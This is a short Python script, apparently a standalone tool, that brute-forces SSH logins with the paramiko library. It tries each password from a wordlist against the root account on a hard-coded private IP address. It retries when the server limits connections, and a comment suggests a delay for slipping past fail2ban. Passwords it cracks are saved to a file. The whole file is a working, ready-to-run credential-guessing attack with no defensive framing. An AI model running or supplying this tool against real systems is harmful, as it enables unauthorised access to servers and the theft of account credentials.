import paramiko
import socket
import time
from colorama import init, Fore

#colors
init()
GREEN = Fore.GREEN
RED   = Fore.RED
YELLOW = Fore.YELLOW
RESET = Fore.RESET

ip = "192.168.2.7"
user = "root"
passlist = "passwords.txt"
# default n = 0
# example use 60 for fail2ban
n = 0

def brute_force_ssh(target_ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        start_time = time.time()
        client.connect(hostname=target_ip, username=username, password=password, timeout=2)
    except socket.timeout:
        print(f"{RED}[ LOG ] Ip: {target_ip} is down.{RESET}")
        return False
    except paramiko.AuthenticationException:
        runtime = ("%s" % (time.time() - start_time))
        print(f"[ LOG ] Trying {GREEN}{username}{RESET} and {GREEN}{password}{RESET} on {GREEN}{target_ip}{RESET} in {YELLOW}{runtime:.7}{RESET} seconds")
        client.close()
        time.sleep(n)
        return False
    except paramiko.SSHException:
        delay = 30
        print(f"{YELLOW}[ LOG ] To many connections, retrying after a {delay} seconds delay{RESET}")
        time.sleep(delay)
        return brute_force_ssh(target_ip, username, password)
    else:
        print(f"{GREEN}[ LOG ] Founded:\n\tTarget: {target_ip}\n\tuser: {username}\n\tpassword: {password}{RESET}")
        return True

if __name__ == "__main__":
    
    passlist = open(passlist).read().splitlines()
    for password in passlist:
        if brute_force_ssh(ip, user, password):
            open("foundedtargets.txt", "a+").write(f"{user}@{ip}:{password}\n")
            break
